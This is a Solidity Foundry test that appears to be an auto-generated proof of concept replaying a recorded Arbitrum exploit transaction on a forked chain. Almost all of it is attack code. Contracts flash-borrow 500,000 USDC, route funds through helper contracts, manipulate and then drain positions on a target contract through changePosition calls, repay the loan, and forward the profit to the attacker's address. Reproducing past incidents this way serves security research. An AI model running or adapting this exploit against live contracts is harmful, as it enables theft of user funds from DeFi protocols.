// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0xbf6ec059f519b668a309e1b6ecb9a8ea62832d95
// Attack Contract : 0x21eda2e3ad975fde9c81769e15ed8e1532eb08a4
// Vulnerable Contract : N/A
// Attack Tx : 0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
// Block : 419829771
// Chain : Arbitrum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : unpriced_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 419829770;
    uint256 constant TX_TIMESTAMP = 1768033835;
    uint256 constant TX_BLOCK_NUMBER = 419829771;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchAttack();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchChildren();
        _bindChildren(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_contract_6CB5;
    }

    function _etchAttack() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchChildren() internal {
        // Exact-address fallback for attack child contracts that were dynamically created in the trace.
        vm.etch(Addresses.attack_contract_6CB5, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_7BEB, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6635, type(AttackChild).runtimeCode);
    }

    function _bindChildren(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        return;
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild public attackChild_1;
    AttackChild public attackChild_2;
    AttackChild public attackChild_3;

    constructor() payable {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x348DF930E825Da25552D8B3dc44e871c67846CB5));
        }
        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0x8c6be2E20306dD1eC40A7E76f40310943953bA7f));
        }
        if (address(attackChild_2) == address(0)) {
            attackChild_2 = AttackChild(payable(0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb));
        }
        if (address(attackChild_3) == address(0)) {
            attackChild_3 = AttackChild(payable(0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x348DF930E825Da25552D8B3dc44e871c67846CB5));
        }
        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0x8c6be2E20306dD1eC40A7E76f40310943953bA7f));
        }
        if (address(attackChild_2) == address(0)) {
            attackChild_2 = AttackChild(payable(0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb));
        }
        if (address(attackChild_3) == address(0)) {
            attackChild_3 = AttackChild(payable(0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635));
        }
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) {
            if (address(attackChild) == address(0)) {
                attackChild = AttackChild(payable(0x348DF930E825Da25552D8B3dc44e871c67846CB5));
            }
            if (address(attackChild_1) == address(0)) {
                attackChild_1 = AttackChild(payable(0x8c6be2E20306dD1eC40A7E76f40310943953bA7f));
            }
            if (address(attackChild_2) == address(0)) {
                attackChild_2 = AttackChild(payable(0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb));
            }
            if (address(attackChild_3) == address(0)) {
                attackChild_3 = AttackChild(payable(0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635));
            }
        }
        require(address(attackChild).code.length != 0, "observed attack child runtime missing");
        Iattack_contract_6CB5(address(attackChild)).run();
        uint256 usdc5cc8BalanceOfAttackAttackContract = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, usdc5cc8BalanceOfAttackAttackContract);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x348DF930E825Da25552D8B3dc44e871c67846CB5));
        attackChild_1 = AttackChild(payable(0x8c6be2E20306dD1eC40A7E76f40310943953bA7f));
        attackChild_2 = AttackChild(payable(0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb));
        attackChild_3 = AttackChild(payable(0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bytes32 private constant REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5 =
        keccak256("poc.replay.REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackChild {
    receive() external payable {}

    function executeOperation(address arg0, uint256 amount, uint256 amount1, address arg3, bytes calldata arg4)
        external
        payable
        returns (bool)
    {
        arg0;
        amount;
        amount1;
        arg3;
        arg4;
        if (!_replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5]) _execOp();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
        return true;
    }

    function openPosition() external payable {
        _handleAttackChildCa();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function zeroPool() external payable {
        _handleAttackChild3();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function drain() external payable {
        _handleAttackChild2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function run() external payable {
        _borrowAndSettle();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x7ef540b0) {
            _handleFlashLoanCa2();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function execOp() external payable {
        if (!_replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5]) _execOp();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function attackChildCb2() external payable {
        _handleAttackChildCa();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoanCallback4() external payable {
        _handleFlashLoanCa2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function attackChildCb() external payable {
        _handleAttackChild3();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function attackChildCb3() external payable {
        _handleAttackChild2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5 =
        keccak256("poc.replay.REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _borrowAndSettle() internal {
        IInitializableImmutableAdminUpgradeabilityProxy_794A61(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61
            ).flashLoanSimple(Addresses.attack_contract_6CB5, Addresses.USDC_5CC8, 500000000000, hex"", 0);
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
        uint256 childUsdcBalance = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_contract, childUsdcBalance);
    }

    function _execOp() internal {
        _replayDone[REPLAY_BALANCE_OF_ATTACK_CONTRACT_6_CB5] = true;
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).updateFunding();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        uint256 usdc5cc8TransferAmount = 1000000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_6635, usdc5cc8TransferAmount);
        AttackChild(payable(Addresses.attack_child_6635)).attackChildCb2();
        uint256 usdc5cc8TransferAmount_2 = 2000000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child, usdc5cc8TransferAmount_2);
        AttackChild(payable(Addresses.attack_child)).attackChildCb();
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        uint256 usdc5cc8TransferAmount_3 = 500000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_7BEB, usdc5cc8TransferAmount_3);
        AttackChild(payable(Addresses.attack_child_7BEB)).flashLoanCallback4();
        uint256 usdc5cc8BalanceOfAttackAttackContract6cb5 = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 approveActionGraphAllowance = 496500000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                    .changePosition(
                        int256(-68000000000000000000), int256(usdc5cc8BalanceOfAttackAttackContract6cb5), int256(0)
                    );
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        AttackChild(payable(Addresses.attack_child_6635)).attackChildCb3();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 usdc5cc8ApproveAllowance = 500250000000;
        IERC20Like(Addresses.USDC_5CC8)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_794A61, usdc5cc8ApproveAllowance);
    }

    function _handleAttackChild3() internal {
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        uint256 usdc5cc8BalanceOfAttackHelper = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 approveActionGraphAllowance = 2000000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                    .changePosition(int256(324678582642240534), int256(usdc5cc8BalanceOfAttackHelper), int256(0));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
    }

    function _handleFlashLoanCall() public {}

    function _handleFlashLoanCa2() internal {
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        uint256 usdc5cc8BalanceOfAttackHelper = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 approveActionGraphAllowance = 500000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                    .changePosition(int256(1000000000000000), int256(usdc5cc8BalanceOfAttackHelper), int256(0));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
    }

    function _handleFlashLoanCa3() public {}

    function _handleAttackChildCa() internal {
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        uint256 usdc5cc8BalanceOfAttackHelper = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 approveActionGraphAllowance = 1000000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, approveActionGraphAllowance);
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                    .changePosition(int256(100000000000000000), int256(usdc5cc8BalanceOfAttackHelper), int256(0));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
    }

    function _handleAttackChild2() internal {
        IERC20Like(Addresses.USDC_5CC8).balanceOf(Addresses.A_F7CA73_80BC);
        {
            if (Addresses.A_F7CA73_80BC.code.length != 0) {
                IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
                    .changePosition(int256(0), int256(-894992852305), int256(0));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.A_F7CA73_80BC = 0xf7ca7384cc6619866749955065f17bedd3ed80bc label=unresolved roles=attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
                );
            }
        }
        uint256 usdc5cc8BalanceOfAttackHelper = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_contract_6CB5, usdc5cc8BalanceOfAttackHelper);
    }

    function _handleFlashLoanCa4() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USDC = 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8;
    address internal constant attack_contract = 0x21EdA2e3ad975Fde9c81769E15Ed8e1532eB08a4;
    address internal constant attack_contract_6CB5 = 0x348DF930E825Da25552D8B3dc44e871c67846CB5;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_625E77 =
        0x625E7708f30cA75bfd92586e17077590C60eb4cD;
    address internal constant A_6749D7_6707 = 0x6749D795bb40Ddf00a953f618CEddA7440216707;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_794A61 =
        0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant RKA = 0x8b194bEae1d3e0788A1a35173978001ACDFba668;
    address internal constant attack_child = 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attacker_eoa = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95;
    address internal constant UniswapV3Pool = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
    address internal constant attack_child_7BEB = 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb;
    address internal constant attack_child_6635 = 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635;
    address internal constant A_F7CA73_80BC = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;
    address internal constant USDC_5CC8 = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
}

interface IContract_F7CA73_80BC {
    function changePosition(int256, int256, int256) external;
    function longPosition() external view;
    function updateFunding() external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_794A61 {
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
}

interface Iattack_child {
    function zeroPool() external;
}

interface Iattack_child_6635 {
    function drain() external;
    function openPosition() external;
}

interface Iattack_contract_6CB5 {
    function run() external;
}
